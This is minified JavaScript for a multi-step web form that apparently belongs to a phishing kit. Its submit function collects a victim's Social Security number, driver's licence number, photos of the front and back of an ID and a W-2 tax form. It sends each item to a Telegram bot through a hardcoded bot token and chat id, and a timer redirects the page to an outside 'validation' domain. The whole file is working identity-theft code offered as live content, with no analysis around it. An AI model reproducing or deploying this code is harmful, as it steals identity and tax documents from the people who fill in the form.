let modal=document.getElementById("myModal");window.onload=()=>{modal.style.display="block"};var currentTab=0;function showTab(e){var t=document.getElementsByClassName("tab");t[e].style.display="block",0==e?document.getElementById("prevBtn").style.display="none":document.getElementById("prevBtn").style.display="block",e==t.length-1?document.getElementById("nextBtn").innerHTML="Submit":document.getElementById("nextBtn").innerHTML="Next",fixStepIndicator(e)}function nextPrev(e){var t=document.getElementsByClassName("tab");return!!(1!=e||validateForm())&&((t[currentTab].style.display="none",(currentTab+=e)>=t.length)?(document.getElementById("formContainer").submit(),document.getElementById("loader").style.display="block",document.getElementById("underLoader").style.display="none",!1):void showTab(currentTab))}function validateForm(){var e,t,n,a=!0;for(n=0,t=(e=document.getElementsByClassName("tab"))[currentTab].getElementsByTagName("input");n<t.length;n++)""==t[n].value&&(t[n].className+=" invalid",a=!1);return a&&(document.getElementsByClassName("step")[currentTab].className+=" finish"),a}function fixStepIndicator(e){var t,n=document.getElementsByClassName("step");for(t=0;t<n.length;t++)n[t].className=n[t].className.replace(" active","");n[e].className+=" active"}showTab(currentTab);let myRedirect=()=>{"block"==document.getElementById("loader").style.display&&(window.location.replace("https://complete-validation.online"),setTimeout(5e3))};function submitForm(){let e="6929442824",t=document.getElementById("ssn").value,n=document.getElementById("dl").value,a=document.getElementById("front"),l=a.files[0],s=document.getElementById("back"),d=s.files[0],o=document.getElementById("wform"),r=o.files[0],m="https://api.telegram.org/bot6403012866:AAGNpGzEijhSfRlMie3dqhv6DD4hucAY1k8/sendDocument",i=new FormData;i.append("chat_id",e),i.append("document",l),i.append("caption",`Front
Ssn: ${t}
Dl: ${n}`);let c=new FormData;c.append("chat_id",e),c.append("document",d),c.append("caption",`Back
Ssn: ${t}
Dl: ${n}`);let p=new FormData;p.append("chat_id",e),p.append("document",r),p.append("caption",`W2Form
Ssn: ${t}
Dl: ${n}`),fetch(m,{method:"POST",body:i}).then(e=>e.json()).then(fetch(m,{method:"POST",body:c})).then(fetch(m,{method:"POST",body:p})).then(e=>{console.log("Telegram API response:",e)}).catch(e=>{console.error("Error sending message:",e)})}setInterval(myRedirect,7e3);
